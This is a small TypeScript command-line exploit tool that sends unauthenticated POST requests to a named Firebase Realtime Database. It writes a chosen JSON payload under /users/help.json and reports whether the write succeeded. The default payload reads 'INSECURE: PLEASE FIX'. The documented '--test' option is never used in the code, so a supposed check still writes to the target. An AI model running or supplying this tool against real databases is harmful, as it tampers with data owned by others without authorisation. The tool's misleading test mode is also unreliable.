import fetch from "node-fetch";
import yargs from "yargs";

const args = yargs
	.usage(`Usage: expf -p {"foo":"bar"} FIREBASE_HOST`)
	.demandCommand(1)
	.describe("host", "the unique subdomain between https://_____.firebaseio.com")
	.alias("p", "payload")
	.describe("payload", "a json object to input in the database")
	.default("p", `{"INSECURE": "PLEASE FIX"}`)
	.alias("t", "test")
	.describe("test", "just check if firebase can be exploited")
	.nargs("test", 0)
	.help("h")
	.example(
		`expf -p {"foo":"bar"} sample-fb43857`,
		"try exploit for host with given payload"
	)
	.example(`expf sample-fb43857`, "try exploit for host with default payload")
	.example(
		`expf sample-fb43857 --test`,
		"quick check if firebase can be exploited"
	).argv;

(async () => {
	const body = args.payload as string;
	const res = await fetch(
		`https://${args.host}.firebaseio.com/users/help.json`,
		{
			method: "POST",
			body,
			headers: {
				Accept: "application/json, text/plain, */*",
				"Content-Type": "application/json",
			},
		}
	);

	switch (res.status) {
		case 200:
			console.log("[>] EXPLOIT SUCCESSFUL");
			break;
		case 401:
			console.log("[x] NOT EXPLOITABLE \n[?] Reason: All Permissions Denied");
			break;
		case 404:
			console.log("[x] Database Not Found \n[?] Reason: Firebase DB Not Found");
			break;
		default:
			console.log("[x] NOT EXPLOITABLE \n[?] Reason: Unknown Error\n");
	}
})();
